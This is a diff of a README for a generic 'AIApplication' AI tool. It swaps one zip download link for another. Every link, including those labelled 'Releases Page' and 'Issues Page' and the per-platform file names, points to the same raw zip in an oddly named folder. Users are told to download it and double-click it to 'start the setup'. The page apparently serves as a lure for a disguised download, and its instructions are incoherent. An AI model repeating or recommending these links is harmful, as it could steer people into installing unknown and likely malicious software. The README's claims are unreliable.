@@ -1,7 +1,7 @@
 # 🎉 AIApplication - Discover the Power of AI in Simple Steps
 
 ## 📥 Download Now
-[![Download AIApplication](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip)](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip)
+[![Download AIApplication](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip)](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip)
 
 ## 📖 Overview
 AIApplication provides users with the ability to harness the potential of artificial intelligence easily. Designed for non-technical users, it aims to make AI applications accessible to everyone. Whether you want to automate tasks, enhance creativity, or simply explore the world of AI, this application can help you achieve your goals.
@@ -9,7 +9,7 @@ AIApplication provides users with the ability to harness the potential of artifi
 ## 🚀 Getting Started
 Follow these simple steps to get started with AIApplication.
 
-1. Navigate to the [Releases Page](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip).
+1. Navigate to the [Releases Page](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip).
 2. Here, you will find the latest version of AIApplication.
 3. Click on the version number to see the available files.
 
@@ -23,22 +23,22 @@ Before you begin, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download AIApplication, please follow these steps:
 
-1. Visit the Releases Page at [this link](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip).
+1. Visit the Releases Page at [this link](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip).
 2. Locate the latest version.
 3. Click on the appropriate file to download. 
-   - For Windows, look for `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip`.
-   - For macOS, look for `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip`.
-   - For Linux, look for `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip` or the appropriate package file.
+   - For Windows, look for `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip`.
+   - For macOS, look for `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip`.
+   - For Linux, look for `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip` or the appropriate package file.
 4. Once the download is complete, find the downloaded file in your Downloads folder.
 
    - For Windows:
-      - Double-click the `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip` file to start the setup.
+      - Double-click the `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip` file to start the setup.
    
    - For macOS:
-      - Open the `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip`, and drag the app into your Applications folder.
+      - Open the `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip`, and drag the app into your Applications folder.
 
    - For Linux:
-      - Unzip the `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip` file, then follow the instructions in the README file inside the folder.
+      - Unzip the `https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip` file, then follow the instructions in the README file inside the folder.
 
 5. After installation, locate AIApplication in your applications list and open it.
 
@@ -64,7 +64,7 @@ If you run into issues during installation or usage, try the following steps:
 - **Check System Requirements:** Ensure your device meets all minimum requirements.
 - **Visit the FAQs:** Go to the FAQ section in the Help menu within the application.
 
-If you need further assistance, feel free to report issues on the [Issues Page](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip).
+If you need further assistance, feel free to report issues on the [Issues Page](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip).
 
 ## 📞 Support
 For support, please reach out via the contact options available on the repository page or consult the community discussions. Your feedback helps us improve AIApplication continually.
@@ -74,6 +74,6 @@ For support, please reach out via the contact options available on the repositor
 - **Community Forum:** Join discussions with other users and get tips on best practices.
 
 ## 🔗 Links
-To download and learn more, visit our releases page: [Releases Page](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_3.4-alpha.3.zip). 
+To download and learn more, visit our releases page: [Releases Page](https://github.com/olabisih/AIApplication/raw/refs/heads/main/amniomancy/Application_AI_v2.8.zip). 
 
 Now you are ready to explore the capabilities of AIApplication! Enjoy your journey into the world of artificial intelligence!
